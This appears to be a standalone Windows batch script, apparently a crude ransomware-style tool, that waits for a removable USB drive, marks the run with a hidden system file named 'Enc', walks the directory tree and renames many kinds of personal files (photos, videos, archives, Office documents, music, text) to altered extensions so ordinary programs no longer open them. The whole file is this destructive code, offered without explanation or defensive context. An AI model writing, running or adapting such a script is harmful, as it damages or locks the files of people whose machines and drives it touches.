@echo off
echo.
setlocal enableDelayedExpansion
md %systemdrive%\script
echo 1 >%systemdrive%\script\counter.txt
:sp
SETLOCAL enableextensions
set "USBCounter=0"
for /F "tokens=2 delims==" %%G in ('
WMIC logicaldisk where "DriveType=2" get DeviceID /value 2^>NUL ^| find "="
') do for /F "tokens=*" %%i in ("%%G") do ( 
set /A "USBCounter+=1"
set Drive=%%i
)
if %USBCounter%==1 goto detect
ENDLOCAL
goto sp
exit
:detect
cls
if exist Enc goto term
echo 123>Enc
attrib +h +s Enc
dir /a:d /s /b>%systemdrive%\script\print.txt
echo %Drive%\>>%systemdrive%\script\print.txt
cls
set /a co=0
:Loop
set /a co+=1
echo %co% >123
for /f "Delims=" %%a in (123) do (
set countfile=%%a
)
if %countfile%==10 goto term

set /a count=0
for /F "tokens=*" %%A in (%systemdrive%\script\print.txt) do (
set /a count+=1
set File[!count!]=%%A
)

set /a count=0
:repeat
find /c "!count!" %systemdrive%\script\counter.txt && goto process
set /a count+=1
goto repeat

:process
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.jpg" "*.filejpg"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.jpeg" "*.filejpg"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.mp4" "*.filemp4"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.zip" "*.filezip"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.rar" "*.filerar"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.png" "*.filepng"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.bmp" "*.filebmp"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.mkv" "*.filemkv"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.docx" "*.filedocx"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.amv" "*.fileamv"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.mp3" "*.filemp3"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.ppt" "*.fileppt"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.txt" "*.filetxt"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.xlsm" "*.filexlsm"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.xls" "*.filexls"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.xltm" "*.filexltm"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.wav" "*.filewav"
::move "%st%\%num%.jpg" %st1%
cls
set /a count+=1
echo !count! >%systemdrive%\script\counter.txt
goto Loop
:term
ren file.filetxt file.txt 
exit